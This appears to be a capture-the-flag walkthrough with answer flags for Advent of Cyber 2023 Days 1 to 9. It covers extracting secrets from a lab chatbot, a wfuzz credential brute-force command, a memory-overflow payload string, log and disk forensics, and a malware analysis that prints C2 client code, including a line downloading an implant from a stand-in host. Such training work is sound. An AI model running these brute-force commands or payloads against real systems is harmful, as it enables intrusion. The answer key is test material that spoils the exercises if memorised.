> # Advent of Cyber 2023

# Summary
<!-- TOC -->

- [Summary](#summary)
    - [Task 7 - [Day 1] Machine learning Chatbot, tell me, if you're really safe?](#task-7---day-1-machine-learning-chatbot-tell-me-if-youre-really-safe)
    - [Task 8 - [Day 2] Log analysis O Data, All Ye Faithful](#task-8---day-2-log-analysis-o-data-all-ye-faithful)
    - [Task 9 - [Day 3] Brute-forcing Hydra is Coming to Town](#task-9---day-3-brute-forcing-hydra-is-coming-to-town)
    - [Task 10 - [Day 4] Brute-forcing Baby, it's CeWLd outside](#task-10---day-4-brute-forcing-baby-its-cewld-outside)
    - [Task 11 - [Day 5] Reverse engineering A Christmas DOScovery: Tapes of Yule-tide Past](#task-11---day-5-reverse-engineering-a-christmas-doscovery-tapes-of-yule-tide-past)
    - [Task 12 - [Day 6] Memory corruption Memories of Christmas Past](#task-12---day-6-memory-corruption-memories-of-christmas-past)
    - [Task 13 - [Day 7] Log analysis ‘Tis the season for log chopping!](#task-13---day-7-log-analysis-tis-the-season-for-log-chopping)
    - [Task 14 - [Day 8] Disk forensics Have a Holly, Jolly Byte!](#task-14---day-8-disk-forensics-have-a-holly-jolly-byte)
    - [Task 15 - [Day 9] Malware analysis She sells C# shells by the C2shore](#task-15---day-9-malware-analysis-she-sells-c-shells-by-the-c2shore)

<!-- /TOC -->

## Task 7 - [Day 1] Machine learning Chatbot, tell me, if you're really safe?
1. What is McGreedy's personal email address?<br>
    Ask the chatbot as the guideline.<br>
    ![](images/1.png)<br>
    **Answer:** t.mcgreedy@antarcticrafts.thm

1. What is the password for the IT server room door?<br>
    ![](images/2.png)<br>
    **Answer:** BtY2S02

1. What is the name of McGreedy's secret project?<br>
    ![](images/3.png)<br>
    **Answer:** Purple Snow

## Task 8 - [Day 2] Log analysis O Data, All Ye Faithful
1. How many packets were captured (looking at the PacketNumber)?<br>
    Run `df.count()` to get the number of PacketNumber.<br>
    ```
    PacketNumber    100
    Timestamp       100
    Source          100
    Destination     100
    Protocol        100
    dtype: int64
    ```
    **Answer:** 100

1. What IP address sent the most amount of traffic during the packet capture?<br>
    Count frequency of column 'Source' with `df.groupby(['Source']).size()`<br>
    ```
    Source
    10.10.1.1      8
    10.10.1.10     8
    10.10.1.2     12
    10.10.1.3     13
    10.10.1.4     15
    10.10.1.5      5
    10.10.1.6     14
    10.10.1.7      5
    10.10.1.8      9
    10.10.1.9     11
    ```
    **Answer:** 10.10.1.4

1. What was the most frequent protocol?<br>
    Use `df.groupby(['Protocol']).size().idxmax()` to get the most frequent protocol.<br>
    **Answer:** ICMP

## Task 9 - [Day 3] Brute-forcing Hydra is Coming to Town
1. Using crunch and hydra, find the PIN code to access the control system and unlock the door. What is the flag?<br>
    Generate the password list, then use `hydra` to brute force the PIN.<br>
    ![](images/4.png)<br>
    **Answer:** THM{pin-code-brute-force}

## Task 10 - [Day 4] Brute-forcing Baby, it's CeWLd outside
1. What is the correct username and password combination? Format username:password<br>
    Follow step-by-step from the document.<br>
    ```
    $ wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.153.192/login.php -d "username=FUZZ&password=FUZ2Z"
    /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
    ********************************************************
    * Wfuzz 3.1.0 - The Web Fuzzer                         *
    ********************************************************

    Target: http://10.10.153.192/login.php
    Total requests: 9361

    =====================================================================
    ID           Response   Lines    Word       Chars       Payload                                                                                                              
    =====================================================================

    000006317:   302        118 L    297 W      4442 Ch     "isaias - Happiness"
    ```
    **Answer:** isaias:Happiness

1. What is the flag?<br>
    Select the message from kevin.<br>
    ![](images/5.png)<br>
    **Answer:** THM{m3rrY4nt4rct1crAft$}

## Task 11 - [Day 5] Reverse engineering A Christmas DOScovery: Tapes of Yule-tide Past
1. How large (in bytes) is the AC2023.BAK file?<br>
    Use `dir C:\` to get info of all files in C drive.<br>
    ![](images/6.png)<br>
    **Answer:** 12,704

1. What is the name of the backup program?<br>
    Read `readme.txt` in `Tools\Backup`
    ![](images/7.png)<br>
    **Answer:** BackupMaster3000

1. What should the correct bytes be in the backup's file signature to restore the backup properly?<br>
    **Answer:** 41 43

1. What is the flag after restoring the backup successfully?<br>
    Restore the file to get the flag.<br>
    ![](images/8.png)<br>
    **Answer:** THM{0LD_5SCH00L_C00L_d00D}

## Task 12 - [Day 6] Memory corruption Memories of Christmas Past
1. If the coins variable had the in-memory value in the image below, how many coins would you have in the game?<br>
    Use python to convert the hex string to decimal.<br>
    ```>>> 0x53504f4f
    1397772111```
    **Answer:** 1397772111

1. What is the value of the final flag?<br>
    The payload to get the flag is `aaaaaaaaaaaaBBBBCCCCCCCCCCCCDDDDDDDDDDDDEEEE123456789abcdef0`.<br>
    **Answer:** THM{mchomeybell_is_the_real_star}

## Task 13 - [Day 7] Log analysis ‘Tis the season for log chopping!
1. How many unique IP addresses are connected to the proxy server?<br>
    Use pipeline command to get the number of uniqe value
    ```
    ~/Desktop/artefacts$ cat access.log | cut -d " " -f 2 | sort | uniq | wc -l
    9
    ```
    **Answer:** 9

1. What status code is generated by the HTTP requests to the least accessed domain?<br>
    The domain is the third column, then we split by ':' character.<br>
    ```
    ~/Desktop/artefacts$ cat access.log | cut -d " " -f 3 | cut -d ":" -f 1 | sort | uniq | wc -l
    111
    ```
    **Answer:** 111

1. What status code is generated by the HTTP requests to the least accessed domain?<br>
    **Answer:** 503

1. Based on the high count of connection attempts, what is the name of the suspicious domain?<br>
    Add `-c` to command on Q2, we will se this line.<br>
    ```1581 frostlings.bigbadstash.thm```
    **Answer:** frostlings.bigbadstash.thm

1. What is the source IP of the workstation that accessed the malicious domain?<br>
    Filter this domain on `access.log`.<br>
    ```
    $ cat access.log | grep frostlings.bigbadstash.thm | cut -d " " -f 2 | uniq
    10.10.185.225
    ```
    **Answer:** 10.10.185.225

1. How many requests were made on the malicious domain in total?<br>
    From the above question, we already have the answer.<br>
    **Answer:** 1581

1. Having retrieved the exfiltrated data, what is the hidden flag?<br>
    Eache request will have a base64 string, extract it then decode them you will the line has the flag. Or you can filter `THM` string to print only this line has the flag.<br>
    ```
    $ cat access.log | grep frostlings.bigbadstash.thm | cut -d "=" -f 2 | cut -d " " -f 1 | base64 -d
    [SNIP]
    72703959c91cb18edbefedc692c45204,SOC Analyst,THM{a_gift_for_you_awesome_analyst!}
    ```
    **Answer:** THM{a_gift_for_you_awesome_analyst!}

## Task 14 - [Day 8] Disk forensics Have a Holly, Jolly Byte!
1. What is the malware C2 server?<br>
    Import PhysicalDrive2 to FTK, you will the `DO_NOT_OPEN` folder, there is a txt file inside contains the C2 domain.<br>
    ![](images/9.png)<br>
    **Answer:** mcgreedysecretc2.thm

1. What is the file inside the deleted zip archive?<br>
    Select the zip file, you will the name of PE file inside.<br>
    ![](images/10.png)<br>
    **Answer:** JuicyTomaTOY.exe

1. What flag is hidden in one of the deleted PNG files?<br>
    The flag is in `portrait.png`, use hex view then search for the string `THM{`.<br>
    ![](images/11.png)<br>
    **Answer:** THM{byt3-L3vel_@n4Lys15}

1. What is the SHA1 hash of the physical drive and forensic image?<br>
    Verify the image, you will see the answer appear.<br>
    ![](images/12.png)<br>
    **Answer:** 39f2dea6ffb43bf80d80f19d122076b3682773c2

## Task 15 - [Day 9] Malware analysis She sells C# shells by the C2shore
1. What HTTP User-Agent was used by the malware for its connection requests to the C2 server?<br>
    In `PostIt` function, the attacker defined some attribute for the the request.<br>
    ```c#
    public static string PostIt(string url, string data)
    {
        HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
        byte[] bytes = Encoding.ASCII.GetBytes(data);
        httpWebRequest.Method = "POST";
        httpWebRequest.ContentType = "application/x-www-form-urlencoded";
        httpWebRequest.ContentLength = (long)bytes.Length;
        httpWebRequest.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15";
        using (Stream requestStream = httpWebRequest.GetRequestStream())
        {
            requestStream.Write(bytes, 0, bytes.Length);
        }
        return new StreamReader(((HttpWebResponse)httpWebRequest.GetResponse()).GetResponseStream()).ReadToEnd();
    }
    ```
    **Answer:** Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15

1. What is the HTTP method used to submit the command execution output?<br>
    **Answer:** POST

1. What key is used by the malware to encrypt or decrypt the C2 data?<br>
    In `Encryptor` or `Decryptor` function, the `bytes` variable contains the key attacker use to encrypt/decrypt the C2 data.<br>
    ```C#
    byte[] bytes = Encoding.ASCII.GetBytes("youcanthackthissupersecurec2keys");
    ```
    **Answer:** youcanthackthissupersecurec2keys

1. What is the first HTTP URL used by the malware?
    In `Main` function, the `url` is the first URL attacker used in `PostIt`.<br>
    **Answer:** http://mcgreedysecretc2.thm/reg

1. How many seconds is the hardcoded value used by the sleep function?<br>  
    In `Main`, `Sleeper` function is call with value 15000 miliseconds corresponding to 15 seconds.<br>
    **Answer:** 15

1. What is the C2 command the attacker uses to execute commands via cmd.exe?<br>
    If the command is `shell`, the code will call `ExecuteCommand` function.<br>
    **Answer:** shell

1. What is the domain used by the malware to download another binary?<br>
    If the command is `implant`, the PE file will download another PE file.<br>
    ```c#
    string text2 = Program.Implant("http://stash.mcgreedy.thm/spykit.exe");
    ```
    **Answer:** stash.mcgreedy.thm

